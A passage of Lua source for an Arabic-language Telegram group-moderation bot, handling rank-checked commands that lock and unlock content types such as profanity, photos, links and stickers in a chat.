if is_leaderid(msg.sender_user_id_) then
tar = 'المطور 🌟'
elseif is_sudoid(msg.sender_user_id_) then
tar = 'المطور 🌟'
elseif is_admin(msg.sender_user_id_) then
tar = 'المطور 🌟'
elseif is_onall(msg.sender_user_id_) then
tar = 'المدير 🥇'
elseif is_moall(msg.sender_user_id_) then
tar = 'الادمن 🥈'
elseif is_monsh(msg.sender_user_id_, msg.chat_id_) then
tar = 'المنشئ 🎖'
elseif is_owner(msg.sender_user_id_, msg.chat_id_) then
tar = 'المدير 🥇'
elseif is_momod(msg.sender_user_id_, msg.chat_id_) then
tar = 'الادمن 🥈'          
end
local DevProx = '📤┇ رتبتك : '..tar..' \n🗑┇ تم قفل »  الفشار  \n🚸┇بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, DevProx, 57, string.len(msg.sender_user_id_))
DevAbs:del(DevProx.."fshar"..msg.chat_id_)
end
if text == 'فتح الفشار' and is_owner(msg.sender_user_id_, msg.chat_id_) then
if is_leaderid(msg.sender_user_id_) then
tar = 'المطور 🌟'
elseif is_sudoid(msg.sender_user_id_) then
tar = 'المطور 🌟'
elseif is_admin(msg.sender_user_id_) then
tar = 'المطور 🌟'
elseif is_onall(msg.sender_user_id_) then
tar = 'المدير 🥇'
elseif is_moall(msg.sender_user_id_) then
tar = 'الادمن 🥈'
elseif is_monsh(msg.sender_user_id_, msg.chat_id_) then
tar = 'المنشئ 🎖'
elseif is_owner(msg.sender_user_id_, msg.chat_id_) then
tar = 'المدير 🥇'
elseif is_momod(msg.sender_user_id_, msg.chat_id_) then
tar = 'الادمن 🥈'          
end
local DevProx = '📤┇ رتبتك : '..tar..' \n🏆┇ تم فتح »   الفشار  \n🚸┇بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, DevProx, 58, string.len(msg.sender_user_id_))
DevAbs:set(DevProx.."fshar"..msg.chat_id_, true)
end
if text == 'قفل الطائفيه' and is_owner(msg.sender_user_id_, msg.chat_id_) then
if is_leaderid(msg.sender_user_id_) then
tar = 'المطور 🌟'
elseif is_sudoid(msg.sender_user_id_) then
tar = 'المطور 🌟'
elseif is_admin(msg.sender_user_id_) then
tar = 'المطور 🌟'
elseif is_onall(msg.sender_user_id_) then
tar = 'المدير 🥇'
elseif is_moall(msg.sender_user_id_) then
tar = 'الادمن 🥈'
elseif is_monsh(msg.sender_user_id_, msg.chat_id_) then
tar = 'المنشئ 🎖'
elseif is_owner(msg.sender_user_id_, msg.chat_id_) then
tar = 'المدير 🥇'
elseif is_momod(msg.sender_user_id_, msg.chat_id_) then
tar = 'الادمن 🥈'          
end
local DevProx = '📤┇ رتبتك : '..tar..' \n🗑┇ تم قفل »  الطائفيه  \n🚸┇بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, DevProx, 59, string.len(msg.sender_user_id_))
DevAbs:del(DevProx.."taf"..msg.chat_id_)
end
if text == 'فتح الطائفيه' and is_owner(msg.sender_user_id_, msg.chat_id_) then
if is_leaderid(msg.sender_user_id_) then
tar = 'المطور 🌟'
elseif is_sudoid(msg.sender_user_id_) then
tar = 'المطور 🌟'
elseif is_admin(msg.sender_user_id_) then
tar = 'المطور 🌟'
elseif is_onall(msg.sender_user_id_) then
tar = 'المدير 🥇'
elseif is_moall(msg.sender_user_id_) then
tar = 'الادمن 🥈'
elseif is_monsh(msg.sender_user_id_, msg.chat_id_) then
tar = 'المنشئ 🎖'
elseif is_owner(msg.sender_user_id_, msg.chat_id_) then
tar = 'المدير 🥇'
elseif is_momod(msg.sender_user_id_, msg.chat_id_) then
tar = 'الادمن 🥈'          
end
local DevProx = '📤┇ رتبتك : '..tar..' \n🏆┇ تم فتح »   الطائفيه  \n🚸┇بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, DevProx, 60, string.len(msg.sender_user_id_))
DevAbs:set(DevProx.."taf"..msg.chat_id_, true)
end
if text == 'قفل الكفران' and is_owner(msg.sender_user_id_, msg.chat_id_) then
if is_leaderid(msg.sender_user_id_) then
tar = 'المطور 🌟'
elseif is_sudoid(msg.sender_user_id_) then
tar = 'المطور 🌟'
elseif is_admin(msg.sender_user_id_) then
tar = 'المطور 🌟'
elseif is_onall(msg.sender_user_id_) then
tar = 'المدير 🥇'
elseif is_moall(msg.sender_user_id_) then
tar = 'الادمن 🥈'
elseif is_monsh(msg.sender_user_id_, msg.chat_id_) then
tar = 'المنشئ 🎖'
elseif is_owner(msg.sender_user_id_, msg.chat_id_) then
tar = 'المدير 🥇'
elseif is_momod(msg.sender_user_id_, msg.chat_id_) then
tar = 'الادمن 🥈'          
end
local DevProx = '📤┇ رتبتك : '..tar..' \n🗑┇ تم قفل »  الكفران  \n🚸┇بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, DevProx, 58, string.len(msg.sender_user_id_))
DevAbs:del(DevProx.."kaf"..msg.chat_id_)
end
if text == 'فتح الكفران' and is_owner(msg.sender_user_id_, msg.chat_id_) then
if is_leaderid(msg.sender_user_id_) then
tar = 'المطور 🌟'
elseif is_sudoid(msg.sender_user_id_) then
tar = 'المطور 🌟'
elseif is_admin(msg.sender_user_id_) then
tar = 'المطور 🌟'
elseif is_onall(msg.sender_user_id_) then
tar = 'المدير 🥇'
elseif is_moall(msg.sender_user_id_) then
tar = 'الادمن 🥈'
elseif is_monsh(msg.sender_user_id_, msg.chat_id_) then
tar = 'المنشئ 🎖'
elseif is_owner(msg.sender_user_id_, msg.chat_id_) then
tar = 'المدير 🥇'
elseif is_momod(msg.sender_user_id_, msg.chat_id_) then
tar = 'الادمن 🥈'          
end
local DevProx = '📤┇ رتبتك : '..tar..' \n🏆┇ تم فتح »   الكفران  \n🚸┇بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, DevProx, 59, string.len(msg.sender_user_id_))
DevAbs:set(DevProx.."kaf"..msg.chat_id_, true)
end
-------------------------------------DevProx----------------------------------------------------------
if is_momod(msg.sender_user_id_, msg.chat_id_) then
if text:match("^[Uu]nlock (.*)$") or text:match("^فتح (.*)$") then
local unmutept = {string.match(text, "^([Uu]nlock) (.*)$")}
if is_leaderid(msg.sender_user_id_) then
tar = 'المطور 🌟'
elseif is_sudoid(msg.sender_user_id_) then
tar = 'المطور 🌟'
elseif is_admin(msg.sender_user_id_) then
tar = 'المطور 🌟'
elseif is_onall(msg.sender_user_id_) then
tar = 'المدير 🥇'
elseif is_moall(msg.sender_user_id_) then
tar = 'الادمن 🥈'
elseif is_monsh(msg.sender_user_id_, msg.chat_id_) then
tar = 'المنشئ 🎖'
elseif is_owner(msg.sender_user_id_, msg.chat_id_) then
tar = 'المدير 🥇'
elseif is_momod(msg.sender_user_id_, msg.chat_id_) then
tar = 'الادمن 🥈'          
end
local unmutepts = {string.match(text, "^(فتح) (.*)$")}
if unmutept[2] == "all" or unmutepts[2] == "الكل" or unmutepts[2] == "الكل بالساعات" then
if DevAbs:get(DevProx..'bot:text:mute'..msg.chat_id_) and DevAbs:get(DevProx..'bot:inline:mute'..msg.chat_id_) and DevAbs:get(DevProx..'bot:photo:mute'..msg.chat_id_) and DevAbs:get(DevProx..'bot:spam:mute'..msg.chat_id_) and DevAbs:get(DevProx..'bot:video:mute'..msg.chat_id_) and DevAbs:get(DevProx..'bot:gifs:mute'..msg.chat_id_) and DevAbs:get(DevProx..'bot:music:mute'..msg.chat_id_) and DevAbs:get(DevProx..'bot:voice:mute'..msg.chat_id_) and DevAbs:get(DevProx..'bot:links:mute'..msg.chat_id_) and DevAbs:get(DevProx..'bot:location:mute'..msg.chat_id_) and DevAbs:get(DevProx..'tags:lock'..msg.chat_id_) and DevAbs:get(DevProx..'bot:strict'..msg.chat_id_) and DevAbs:get(DevProx..'bot:document:mute'..msg.chat_id_) and DevAbs:get(DevProx..'bot:abstag:mute'..msg.chat_id_) and DevAbs:get(DevProx..'bot:contact:mute'..msg.chat_id_) and DevAbs:get(DevProx..'bot:webpage:mute'..msg.chat_id_) and DevAbs:get(DevProx..'bot:arabic:mute'..msg.chat_id_) and DevAbs:get(DevProx..'bot:english:mute'..msg.chat_id_) and DevAbs:get(DevProx..'bot:sticker:mute'..msg.chat_id_) and DevAbs:get(DevProx..'markdown:lock'..msg.chat_id_) and DevAbs:get(DevProx..'bot:forward:mute'..msg.chat_id_) and DevAbs:get(DevProx..'editmsg'..msg.chat_id_) and DevAbs:get(DevProx..'bot:cmds'..msg.chat_id_) and DevAbs:get(DevProx..'bot:bots:mute'..msg.chat_id_) and DevAbs:get(DevProx..'bot:bots:ban'..msg.chat_id_) and DevAbs:get(DevProx..'keed_bots'..msg.chat_id_) and DevAbs:get(DevProx..'anti-flood:'..msg.chat_id_) and DevAbs:get(DevProx..'bot:pin:mute'..msg.chat_id_) then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ Has been unlock all ☑️', 1, 'md')
else
local DevProx = '📤┇ رتبتك : '..tar..' \n🏆┇ تم فتح »   كل الوسائط  \n🎖┇ بواسطه ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, DevProx, 62, string.len(msg.sender_user_id_))
end
DevAbs:del(DevProx..'editmsg'..msg.chat_id_)
DevAbs:del(DevProx..'bot:cmds'..msg.chat_id_)
DevAbs:del(DevProx..'bot:bots:mute'..msg.chat_id_)
DevAbs:del(DevProx..'bot:bots:ban'..msg.chat_id_)
DevAbs:del(DevProx..'keed_bots'..msg.chat_id_)
DevAbs:del(DevProx..'anti-flood:'..msg.chat_id_)
DevAbs:del(DevProx..'bot:pin:mute'..msg.chat_id_)
DevAbs:del(DevProx..'bot:text:mute'..msg.chat_id_)
DevAbs:del(DevProx..'bot:photo:mute'..msg.chat_id_)
DevAbs:del(DevProx..'bot:spam:mute'..msg.chat_id_)
DevAbs:del(DevProx..'bot:video:mute'..msg.chat_id_)
DevAbs:del(DevProx..'bot:document:mute'..msg.chat_id_)
DevAbs:del(DevProx..'bot:inline:mute'..msg.chat_id_)
DevAbs:del(DevProx..'markdown:lock'..msg.chat_id_)
DevAbs:del(DevProx..'bot:gifs:mute'..msg.chat_id_)
DevAbs:del(DevProx..'bot:music:mute'..msg.chat_id_)
DevAbs:del(DevProx..'bot:voice:mute'..msg.chat_id_)
DevAbs:del(DevProx..'bot:links:mute'..msg.chat_id_)
DevAbs:del(DevProx..'bot:location:mute'..msg.chat_id_)
DevAbs:del(DevProx..'tags:lock'..msg.chat_id_)
DevAbs:del(DevProx..'bot:strict'..msg.chat_id_)
DevAbs:del(DevProx..'bot:abstag:mute'..msg.chat_id_)
DevAbs:del(DevProx..'bot:contact:mute'..msg.chat_id_)
DevAbs:del(DevProx..'bot:webpage:mute'..msg.chat_id_)
DevAbs:del(DevProx..'bot:arabic:mute'..msg.chat_id_)
DevAbs:del(DevProx..'bot:english:mute'..msg.chat_id_)
DevAbs:del(DevProx..'bot:sticker:mute'..msg.chat_id_)
DevAbs:del(DevProx..'bot:forward:mute'..msg.chat_id_)
else
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ all » is already unlocked 🔑', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '⏱┇ تم فتح »  كل الوسائط سابقا ✔️', 1, 'md')
end
end
end
if unmutept[2] == "text" or unmutepts[2] == "الدردشه" then
if DevAbs:get(DevProx..'bot:text:mute'..msg.chat_id_) then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ Has been unlock text ☑️', 1, 'md')
else
local DevProx = '📤┇ رتبتك : '..tar..' \n🏆┇ تم فتح »   الدردشه  \n🚸┇بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, DevProx, 59, string.len(msg.sender_user_id_))
end
DevAbs:del(DevProx..'bot:text:mute'..msg.chat_id_)
else
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ text » is already unlocked 🔑', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '⏱┇ تم فتح »  الدردشه سابقا ✔️', 1, 'md')
end
end
end
if unmutept[2] == "photo" or unmutepts[2] == "الصور" then
if DevAbs:get(DevProx..'bot:photo:mute'..msg.chat_id_) then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ Has been unlock photo ☑️', 1, 'md')
else
local DevProx = '📤┇ رتبتك : '..tar..' \n🏆┇ تم فتح »   الصور  \n🚸┇بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, DevProx, 57, string.len(msg.sender_user_id_))
end
DevAbs:del(DevProx..'bot:photo:mute'..msg.chat_id_)
else
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ photo » is already unlocked 🔑', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '⏱┇ تم فتح »  الصور سابقا ✔️', 1, 'md')
end
end
end
if unmutept[2] == "spam" or unmutepts[2] == "الكلايش" then
if DevAbs:get(DevProx..'bot:spam:mute'..msg.chat_id_) then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ Has been unlock spam ☑️', 1, 'md')
else
local DevProx = '📤┇ رتبتك : '..tar..' \n🏆┇ تم فتح »   الكلايش  \n🚸┇بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, DevProx, 59, string.len(msg.sender_user_id_))
end
DevAbs:del(DevProx..'bot:spam:mute'..msg.chat_id_)
else
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ spam » is already unlocked 🔑', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '⏱┇ تم فتح »  الكلايش سابقا ✔️', 1, 'md')
end
end
end
if unmutept[2] == "video" or unmutepts[2] == "الفيديو" then
if DevAbs:get(DevProx..'bot:video:mute'..msg.chat_id_) then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ Has been unlock video ☑️', 1, 'md')
else
local DevProx = '📤┇ رتبتك : '..tar..' \n🏆┇ تم فتح »   الفيديو  \n🚸┇بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, DevProx, 59, string.len(msg.sender_user_id_))
end
DevAbs:del(DevProx..'bot:video:mute'..msg.chat_id_)
else
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '??┇ video » is already unlocked 🔑', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '⏱┇ تم فتح »  الفيديو سابقا ✔️', 1, 'md')
end
end
end
if unmutept[2] == "file" or unmutepts[2] == "الملفات" then
if DevAbs:get(DevProx..'bot:document:mute'..msg.chat_id_) then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ Has been unlock file ☑️', 1, 'md')
else
local DevProx = '📤┇ رتبتك : '..tar..' \n🏆┇ تم فتح »   الملفات  \n🚸┇بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, DevProx, 59, string.len(msg.sender_user_id_))
end
DevAbs:del(DevProx..'bot:document:mute'..msg.chat_id_)
else
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ file » is already unlocked 🔑', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '⏱┇ تم فتح »  الملفات سابقا ✔️', 1, 'md')
end
end
end
if unmutept[2] == "inline" or unmutepts[2] == "الاونلاين" then
if DevAbs:get(DevProx..'bot:inline:mute'..msg.chat_id_) then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ Has been unlock inline ☑️', 1, 'md')
else
local DevProx = '📤┇ رتبتك : '..tar..' \n🏆┇ تم فتح »   الاونلاين  \n🚸┇بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, DevProx, 61, string.len(msg.sender_user_id_))
end
DevAbs:del(DevProx..'bot:inline:mute'..msg.chat_id_)
else
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ inline » is already unlocked 🔑', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '⏱┇ تم فتح »  الاونلاين سابقا ✔️', 1, 'md')
end
end
end
if unmutept[2] == "markdown" or unmutepts[2] == "الماركداون" then
if DevAbs:get(DevProx..'markdown:lock'..msg.chat_id_) then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ Has been unlock markdown ☑️', 1, 'md')
else
local DevProx = '📤┇ رتبتك : '..tar..' \n🏆┇ تم فتح »   الماركداون  \n🚸┇بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, DevProx, 62, string.len(msg.sender_user_id_))
end
DevAbs:del(DevProx..'markdown:lock'..msg.chat_id_)
else
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ markdown » is already unlocked 🔑', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '⏱┇ تم فتح »  الماركداون سابقا ✔️', 1, 'md')
end
end
end
if unmutept[2] == "gif" or unmutepts[2] == "المتحركه" then
if DevAbs:get(DevProx..'bot:gifs:mute'..msg.chat_id_) then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ Has been unlock gif ☑️', 1, 'md')
else
local DevProx = '📤┇ رتبتك : '..tar..' \n🏆┇ تم فتح »   المتحركه  \n🚸┇بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, DevProx, 60, string.len(msg.sender_user_id_))
end
DevAbs:del(DevProx..'bot:gifs:mute'..msg.chat_id_)
else
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ gif » is already unlocked 🔑', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '⏱┇ تم فتح »  المتحركه سابقا ✔️', 1, 'md')
end
end
end
if unmutept[2] == "music" or unmutepts[2] == "الاغاني" then
if DevAbs:get(DevProx..'bot:music:mute'..msg.chat_id_) then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ Has been unlock music ☑️', 1, 'md')
else
local DevProx = '📤┇ رتبتك : '..tar..' \n🏆┇ تم فتح »   الاغاني  \n🚸┇بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, DevProx, 59, string.len(msg.sender_user_id_))
end
DevAbs:del(DevProx..'bot:music:mute'..msg.chat_id_)
else
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ music » is already unlocked 🔑', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '⏱┇ تم فتح »  الاغاني سابقا ✔️', 1, 'md')
end
end
end
if unmutept[2] == "voice" or unmutepts[2] == "الصوت" then
if DevAbs:get(DevProx..'bot:voice:mute'..msg.chat_id_) then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ Has been unlock voice ☑️', 1, 'md')
else
local DevProx = '📤┇ رتبتك : '..tar..' \n🏆┇ تم فتح »   الصوت  \n🚸┇بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, DevProx, 57, string.len(msg.sender_user_id_))
end
DevAbs:del(DevProx..'bot:voice:mute'..msg.chat_id_)
else
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ voice » is already unlocked 🔑', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '⏱┇ تم فتح »  الصوت سابقا ✔️', 1, 'md')
end
end
end
if unmutept[2] == "links" or unmutepts[2] == "الروابط" then
if DevAbs:get(DevProx..'bot:links:mute'..msg.chat_id_) then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ Has been unlock links ☑️', 1, 'md')
else
local DevProx = '📤┇ رتبتك : '..tar..' \n🏆┇ تم فتح »   الروابط  \n🚸┇بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, DevProx, 59, string.len(msg.sender_user_id_))
end
DevAbs:del(DevProx..'bot:links:mute'..msg.chat_id_)
else
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ links » is already unlocked 🔑', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '⏱┇ تم فتح »  الروابط سابقا ✔️', 1, 'md')
end
end
end
if unmutept[2] == "location" or unmutepts[2] == "المواقع" then
if DevAbs:get(DevProx..'bot:location:mute'..msg.chat_id_) then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ Has been unlock location ☑️', 1, 'md')
else
local DevProx = '📤┇ رتبتك : '..tar..' \n🏆┇ تم فتح »   المواقع  \n🚸┇بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, DevProx, 59, string.len(msg.sender_user_id_))
end
DevAbs:del(DevProx..'bot:location:mute'..msg.chat_id_)
else
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ location » is already unlocked 🔑', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '⏱┇ تم فتح »  المواقع سابقا ✔️', 1, 'md')
end
end
end
if unmutept[2] == "tag" or unmutepts[2] == "المعرف" then
if DevAbs:get(DevProx..'tags:lock'..msg.chat_id_) then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ Has been unlock tag ☑️', 1, 'md')
else
local DevProx = '📤┇ رتبتك : '..tar..' \n🏆┇ تم فتح »   المعرف  \n🚸┇بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, DevProx, 58, string.len(msg.sender_user_id_))
end
DevAbs:del(DevProx..'tags:lock'..msg.chat_id_)
else
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ tag » is already unlocked 🔑', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '⏱┇ تم فتح »  المعرف سابقا ✔️', 1, 'md')
end
end
end
if unmutept[2] == "strict" or unmutepts[2] == "الحمايه" then
if DevAbs:get(DevProx..'bot:strict'..msg.chat_id_) then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ Has been unlock strict ☑️', 1, 'md')
else
local DevProx = '📤┇ رتبتك : '..tar..' \n🏆┇ تم فتح »   الحمايه  \n🚸┇بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, DevProx, 59, string.len(msg.sender_user_id_))
end
DevAbs:del(DevProx..'bot:strict'..msg.chat_id_)
else
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ strict » is already unlocked 🔑', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '⏱┇ تم فتح »  الحمايه سابقا ✔️', 1, 'md')
end
end
end
if unmutept[2] == "abstag" or unmutepts[2] == "الهاشتاك" then
if DevAbs:get(DevProx..'bot:abstag:mute'..msg.chat_id_) then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ Has been unlock abstag ☑️', 1, 'md')
else
local DevProx = '📤┇ رتبتك : '..tar..' \n🏆┇ تم فتح »   الهاشتاك  \n🚸┇بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, DevProx, 60, string.len(msg.sender_user_id_))
end
DevAbs:del(DevProx..'bot:abstag:mute'..msg.chat_id_)
else
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ abstag » is already unlocked 🔑', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '⏱┇ تم فتح »  الهاشتاك سابقا ✔️', 1, 'md')
end
end
end
if unmutept[2] == "contact" or unmutepts[2] == "الجهات" then
if DevAbs:get(DevProx..'bot:contact:mute'..msg.chat_id_) then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ Has been unlock contact ☑️', 1, 'md')
else
local DevProx = '📤┇ رتبتك : '..tar..' \n🏆┇ تم فتح »   الجهات  \n🚸┇بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, DevProx, 58, string.len(msg.sender_user_id_))
end
DevAbs:del(DevProx..'bot:contact:mute'..msg.chat_id_)
else
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ contact » is already unlocked 🔑', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '⏱┇ تم فتح »  الجهات سابقا ✔️', 1, 'md')
end
end
end
if unmutept[2] == "webpage" or unmutepts[2] == "الشبكات" then
if DevAbs:get(DevProx..'bot:webpage:mute'..msg.chat_id_) then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ Has been unlock webpage ☑️', 1, 'md')
else
local DevProx = '📤┇ رتبتك : '..tar..' \n🏆┇ تم فتح »   الشبكات  \n🚸┇بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, DevProx, 59, string.len(msg.sender_user_id_))
end
DevAbs:del(DevProx..'bot:webpage:mute'..msg.chat_id_)
else
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ webpag » is already unlocked 🔑', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '⏱┇ تم فتح »  الشبكات سابقا ✔️', 1, 'md')
end
end
end
if unmutept[2] == "arabic" or unmutepts[2] == "العربيه" then
if DevAbs:get(DevProx..'bot:arabic:mute'..msg.chat_id_) then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ Has been unlock arabic ☑️', 1, 'md')
else
local DevProx = '📤┇ رتبتك : '..tar..' \n🏆┇ تم فتح »   العربيه  \n🚸┇بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, DevProx, 59, string.len(msg.sender_user_id_))
end
DevAbs:del(DevProx..'bot:arabic:mute'..msg.chat_id_)
else
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ arabic » is already unlocked 🔑', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '⏱┇ تم فتح »  العربيه سابقا ✔️', 1, 'md')
end
end
end
if unmutept[2] == "english" or unmutepts[2] == "الانكليزيه" then
if DevAbs:get(DevProx..'bot:english:mute'..msg.chat_id_) then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ Has been unlock english ☑️', 1, 'md')
else
local DevProx = '📤┇ رتبتك : '..tar..' \n🏆┇ تم فتح »   الانكليزيه  \n🚸┇بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, DevProx, 62, string.len(msg.sender_user_id_))
end
DevAbs:del(DevProx..'bot:english:mute'..msg.chat_id_)
else
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ english » is already unlocked 🔑', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '⏱┇ تم فتح »  الانكليزيه سابقا ✔️', 1, 'md')
end
end
end
